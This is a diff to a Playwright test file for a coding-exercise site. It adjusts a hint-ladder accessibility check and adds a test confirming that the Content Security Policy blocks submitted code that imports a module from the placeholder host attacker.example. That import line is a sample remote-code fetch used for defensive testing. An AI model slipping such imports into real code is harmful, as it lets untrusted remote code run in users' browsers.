@@ -33,5 +33,25 @@ test("N4: hint ladder stub lists five levels and has no enabled hint buttons", a
   await page.goto("/exercises/sum-array");
   const ladder = page.getByRole("region", { name: "Hint ladder" });
   await expect(ladder.getByRole("listitem")).toHaveCount(5);
-  await expect(ladder.getByRole("button").first()).toBeDisabled();
+  const first = ladder.getByRole("button").first();
+  await expect(first).toHaveAttribute("aria-disabled", "true");
+  await first.focus();
+  await expect(first).toBeFocused();
+});
+
+test("R1: dynamic import of an external module is blocked by CSP", async ({ page }) => {
+  const responses: string[] = [];
+  const failures: string[] = [];
+  page.on("response", (r) => responses.push(r.url()));
+  page.on("requestfailed", (r) => failures.push(`${r.url()} ${r.failure()?.errorText}`));
+  await page.goto("/exercises/sum-array");
+  await page.getByLabel("Your code (JavaScript)").fill(
+    "function sum() { import('https://attacker.example/m.js?x=1'); return 0; }",
+  );
+  await page.getByRole("button", { name: "Run tests" }).click();
+  await expect(page.getByTestId("results")).toBeVisible();
+  await page.waitForTimeout(500);
+  // The browser may log the attempt, but CSP must stop it before any response arrives.
+  expect(responses.filter((u) => u.includes("attacker.example"))).toEqual([]);
+  expect(failures.some((f) => f.includes("attacker.example") && f.includes("csp"))).toBe(true);
 });
